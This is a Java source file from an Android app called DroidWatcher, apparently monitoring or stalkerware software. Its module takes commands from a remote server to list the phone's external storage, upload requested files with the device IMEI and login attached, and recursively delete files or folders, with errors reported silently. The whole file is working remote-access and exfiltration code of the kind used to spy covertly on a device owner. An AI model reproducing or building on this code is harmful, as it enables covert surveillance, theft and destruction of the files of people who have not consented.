package com.droidwatcher.modules;

import java.io.File;
import java.io.IOException;
import java.lang.ref.WeakReference;

import org.acra.ACRA;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.ServerConst;
import com.droidwatcher.variables.ServerMessage;

import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;

public class FileSystemModule {
	private Context mContext;
	private SettingsManager mSettings;
	private static MyHandler sHandler;
	
	private static final int MAX_DEPTH = 100;
	private static final int MAX_FILE_SIZE = 3 * 1024 * 1024;
	private static final String SERVER_ADDRESS = ServerMessanger.SERVER_ADDRESS + "File";
	
	public static final int GET_SDCARD = 1;
	public static final int GET_DIR = 2;
	public static final int GET_FILE = 3;
	public static final int DELETE_FILE = 4;
	
	public FileSystemModule(Context context){
		mContext = context;
		sHandler = new MyHandler(this);
		mSettings = new SettingsManager(context);
	}
	
	public void start(){
		
	}
	
	public void dispose(){
		
	}
	
	private JSONObject getDirStructure(File directory, int depth) {
		try {
			JSONObject dir = new JSONObject();
			dir.put("name", directory.getName());
			
			JSONArray jFiles = new JSONArray();
			JSONArray jDirs = new JSONArray();
			
			File[] list = directory.listFiles();
			if (list != null) {
				int nextStepDepth = depth - 1;
				for (File file : list) {
					if (file.isFile()) {
						jFiles.put(new JSONObject().put("name", file.getName()).put("size", file.length()));
					}
					else{
						if (depth > 0) {
							jDirs.put(getDirStructure(file, nextStepDepth));
						}
						else{
							jDirs.put(new JSONObject().put("name", file.getName()));
						}
					}
				}
			}
			
			dir.put("files", jFiles);
			dir.put("dirs", jDirs);
			
			return dir;
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		
		return null;
	}
	
	private void getExternalStorage(){
		try {
			File rootDir = Environment.getExternalStorageDirectory();
			JSONObject obj = getDirStructure(rootDir, MAX_DEPTH);
			sendResponse(obj, "");
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			sendResponse(null, "");
		}
	}
	
	private void getDirectory(String directory){
		try {
			File rootDir = directory.length() > 0 ? new File(directory) : Environment.getExternalStorageDirectory();
			JSONObject obj = null;
			if (rootDir.exists()) {
				obj = getDirStructure(rootDir, 0);
			}
			sendResponse(obj, directory);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			sendResponse(null, "");
		}
	}
	
	private void sendResponse(JSONObject directory, String path){
		try {
			ServerMessage message = new ServerMessage(MessageType.DIR, mSettings.imei(), mSettings.login());
			message.addParam("path", path);
			message.addParam("dir", directory);
			new ServerMessanger(mContext, message).start();
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void sendError(String path, String error){
		try {
			ServerMessage message = new ServerMessage(MessageType.FSERROR, mSettings.imei(), mSettings.login());
			message.addParam("path", path);
			message.addParam("error", error);
			new ServerMessanger(mContext, message).start();
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void getFile(String fullPath){
		File file = new File(fullPath);
		
		if (!file.exists()) {
			sendError(fullPath, "File does not exist or unavailable");
		}
		
		if (file.length() > MAX_FILE_SIZE) {
			sendError(fullPath, "Maximum file size is: " + MAX_FILE_SIZE / 1024 + " kb.");
		}
		
		try {
		    HttpClient httpclient = new DefaultHttpClient();
		    HttpPost httppost = new HttpPost(SERVER_ADDRESS);
		    
            MultipartEntity multipartEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
            multipartEntity.addPart("params", new StringBody(getParams()));
            multipartEntity.addPart("file", new FileBody(file));
			httppost.setEntity(multipartEntity);

			HttpResponse response = httpclient.execute(httppost);
			if (response != null){
				HttpEntity entity = response.getEntity();
				if (entity != null) {
					String data = EntityUtils.toString(entity, "UTF-8");
					if (data.equals(ServerConst.ERROR)) {
						sendError(fullPath, "File transfer is unsuccessful");
					}
				}
		    }

		} catch(IOException e){
			Debug.exception(e);
		}
		catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void deleteFile(String fullPath){
		try {
			File file = new File(fullPath);
			
			if (file.exists()) {
				deleteRecursive(file);
			}
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	void deleteRecursive(File fileOrDirectory) {
	    if (fileOrDirectory.isDirectory()){
	        for (File child : fileOrDirectory.listFiles()){
	            deleteRecursive(child);
	        }
	    }

	    fileOrDirectory.delete();
	}
	
	private String getParams() throws JSONException{
		JSONObject obj = new JSONObject()
			.put("login", mSettings.login())
			.put("imei", mSettings.imei());
		return obj.toString();
	}
	
	private void handleMessage(final Message msg){
		new Thread(new Runnable() {
			@Override
			public void run() {
				switch (msg.what) {
				case GET_SDCARD:
					getExternalStorage();
					break;
				case GET_DIR:
					getDirectory((String) msg.obj);
					break;
				case GET_FILE:
					getFile((String) msg.obj);
					break;
				case DELETE_FILE:
					deleteFile((String) msg.obj);
					break;
				default:
					break;
				}
			}
		}).start();
	}
	
	public static void message(int what){
		if (sHandler != null) {
			sHandler.sendEmptyMessage(what);
		}
	}
	
	public static void message(Message msg){
		if (sHandler != null) {
			sHandler.sendMessage(msg);
		}
	}
	
	private static class MyHandler extends Handler {
		private final WeakReference<FileSystemModule> mModule;
		
		private MyHandler(FileSystemModule module){
			mModule = new WeakReference<FileSystemModule>(module);
		}
		
		@Override
		public void handleMessage(Message msg) {
			FileSystemModule module = mModule.get();
			
			if (module != null) {
				module.handleMessage(msg);
			}
		}
	}
}
